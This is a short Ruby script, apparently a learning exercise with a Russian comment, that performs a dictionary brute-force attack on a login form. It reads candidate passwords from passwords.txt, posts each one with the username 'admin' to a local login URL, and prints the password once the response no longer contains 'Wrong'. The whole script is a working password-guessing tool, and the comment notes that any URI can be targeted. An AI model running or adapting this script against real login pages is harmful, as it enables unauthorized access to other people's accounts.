require 'net/http'
require 'uri'

# не обязательно обьек uri, может быть любой!
def is_wrong_password? password
	uri  = URI.parse 'http://localhost:4567/login'
	response = Net::HTTP.post_form(uri, :password => password, :username => "admin").body
	response.include? "Wrong"
end

input =File.open "passwords.txt", "r"

while (line = input.gets)
	line.strip!
	print "Trying password #{line} ..."

	if is_wrong_password? line
		puts "Error"
	else 
		puts "Found #{line}"
		input.close
		exit
	end
end 
